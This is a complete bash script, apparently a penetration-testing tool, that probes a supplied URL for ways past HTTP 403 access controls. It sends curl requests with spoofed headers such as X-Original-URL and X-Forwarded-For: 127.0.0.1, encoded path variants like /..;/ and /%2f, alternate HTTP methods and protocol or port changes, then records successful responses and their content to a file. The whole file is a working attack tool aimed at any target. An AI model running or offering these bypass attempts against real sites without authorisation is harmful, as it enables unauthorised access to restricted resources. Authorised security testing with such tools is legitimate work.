#!/bin/bash

# 403 Bypass Script
# Usage: ./403bypass.sh <url>
# Example: ./403bypass.sh https://xyz.com

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

OUTPUT_FILE="bypass_results_$(date +%Y%m%d_%H%M%S).txt"

echo -e "${CYAN}[*] Target: $TARGET${NC}"
echo -e "${CYAN}[*] Output: $OUTPUT_FILE${NC}"
echo "============================================"
echo "Target: $TARGET" > $OUTPUT_FILE
echo "Date: $(date)" >> $OUTPUT_FILE
echo "============================================" >> $OUTPUT_FILE

# ─────────────────────────────────────────────
# Function: make request and check status
# ─────────────────────────────────────────────
check() {
    local DESC=$1
    local CMD=$2

    RESPONSE=$(eval "$CMD" 2>/dev/null)
    STATUS=$(eval "${CMD} -o /dev/null -w '%{http_code}'" 2>/dev/null)
    LENGTH=$(echo "$RESPONSE" | wc -c)

    # Only real bypasses: 200 201 204 401
    # Ignore: 000 301 302 400 403 404 405 409 500 503 504
    if [[ "$STATUS" == "200" || "$STATUS" == "201" || "$STATUS" == "204" || "$STATUS" == "401" ]]; then
        echo -e "${GREEN}[HIT]${NC} $DESC → Status: $STATUS | Length: $LENGTH"
        echo "[HIT] $DESC → Status: $STATUS | Length: $LENGTH" >> $OUTPUT_FILE
        echo "$RESPONSE" | head -30 >> $OUTPUT_FILE
        echo "---" >> $OUTPUT_FILE
    else
        echo -e "${RED}[MISS]${NC} $DESC → $STATUS"
        echo "[MISS] $DESC → $STATUS" >> $OUTPUT_FILE
    fi
}

# ─────────────────────────────────────────────
# 1. Header Bypass
# ─────────────────────────────────────────────
echo -e "\n${YELLOW}[+] Header Bypass${NC}"
echo "" >> $OUTPUT_FILE
echo "=== Header Bypass ===" >> $OUTPUT_FILE

check "X-Original-URL: /"              "curl -sk -H 'X-Original-URL: /' '$TARGET'"
check "X-Rewrite-URL: /"               "curl -sk -H 'X-Rewrite-URL: /' '$TARGET'"
check "X-Forwarded-For: 127.0.0.1"     "curl -sk -H 'X-Forwarded-For: 127.0.0.1' '$TARGET'"
check "X-Forwarded-For: localhost"      "curl -sk -H 'X-Forwarded-For: localhost' '$TARGET'"
check "X-Custom-IP-Authorization: 127.0.0.1" "curl -sk -H 'X-Custom-IP-Authorization: 127.0.0.1' '$TARGET'"
check "X-Forwarded-Host: localhost"     "curl -sk -H 'X-Forwarded-Host: localhost' '$TARGET'"
check "X-Host: localhost"              "curl -sk -H 'X-Host: localhost' '$TARGET'"
check "X-Remote-IP: 127.0.0.1"        "curl -sk -H 'X-Remote-IP: 127.0.0.1' '$TARGET'"
check "X-Client-IP: 127.0.0.1"        "curl -sk -H 'X-Client-IP: 127.0.0.1' '$TARGET'"
check "X-Real-IP: 127.0.0.1"          "curl -sk -H 'X-Real-IP: 127.0.0.1' '$TARGET'"
check "Forwarded: for=127.0.0.1"       "curl -sk -H 'Forwarded: for=127.0.0.1' '$TARGET'"

# ─────────────────────────────────────────────
# 2. Path Bypass
# ─────────────────────────────────────────────
echo -e "\n${YELLOW}[+] Path Bypass${NC}"
echo "" >> $OUTPUT_FILE
echo "=== Path Bypass ===" >> $OUTPUT_FILE

check "/%2f"         "curl -sk '${TARGET}/%2f'"
check "/./"          "curl -sk '${TARGET}/.//'"
check "/.%2f"        "curl -sk '${TARGET}/.%2f'"
check "/..;/"        "curl -sk '${TARGET}/..;/'"
check "/./."         "curl -sk '${TARGET}/./.'"
check "/%20"         "curl -sk '${TARGET}/%20'"
check "/?"           "curl -sk '${TARGET}/?'"
check "/#"           "curl -sk '${TARGET}/#'"
check "/..%2f"       "curl -sk '${TARGET}/..%2f'"

# ─────────────────────────────────────────────
# 3. Method Bypass
# ─────────────────────────────────────────────
echo -e "\n${YELLOW}[+] Method Bypass${NC}"
echo "" >> $OUTPUT_FILE
echo "=== Method Bypass ===" >> $OUTPUT_FILE

check "POST"         "curl -sk -X POST '$TARGET'"
check "PUT"          "curl -sk -X PUT '$TARGET'"
check "PATCH"        "curl -sk -X PATCH '$TARGET'"
check "OPTIONS"      "curl -sk -X OPTIONS '$TARGET'"
check "HEAD"         "curl -sk -X HEAD '$TARGET'"
check "TRACE"        "curl -sk -X TRACE '$TARGET'"

# ─────────────────────────────────────────────
# 4. Protocol/Port Bypass
# ─────────────────────────────────────────────
echo -e "\n${YELLOW}[+] Protocol Bypass${NC}"
echo "" >> $OUTPUT_FILE
echo "=== Protocol Bypass ===" >> $OUTPUT_FILE

HTTP_TARGET=$(echo $TARGET | sed 's/https/http/')
check "HTTP instead of HTTPS"   "curl -sk '$HTTP_TARGET'"
check "HTTP with port 80"       "curl -sk '${HTTP_TARGET}:80'"
check "HTTPS with port 8443"    "curl -sk '${TARGET}:8443'"

# ─────────────────────────────────────────────
# Summary
# ─────────────────────────────────────────────
echo ""
echo "============================================"
HITS=$(grep -c "\[HIT\]" $OUTPUT_FILE)
echo -e "${GREEN}[*] Total Hits: $HITS${NC}"
echo -e "${CYAN}[*] Full results saved to: $OUTPUT_FILE${NC}"
